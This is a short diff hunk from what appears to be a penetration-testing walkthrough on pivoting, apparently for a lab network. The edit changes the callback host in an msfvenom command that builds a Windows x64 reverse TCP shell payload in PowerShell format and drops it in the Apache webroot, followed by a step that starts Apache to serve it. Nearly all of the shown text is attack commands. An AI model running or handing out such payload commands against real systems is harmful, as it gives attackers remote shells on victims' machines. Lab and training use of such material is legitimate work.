@@ -34,7 +34,7 @@ Additional Route Details:
 ### Step-By-Step Instructions For Pivot
 1. (Kali) Make payload and place in apache default webroot
 ```zsh
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8669 -f psh -o /var/www/html/win-x64-8669.txt;
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.1.200 LPORT=8669 -f psh -o /var/www/html/win-x64-8669.txt;
 ```
 2. (Kali) Start apache2 to host payload
 ```zsh
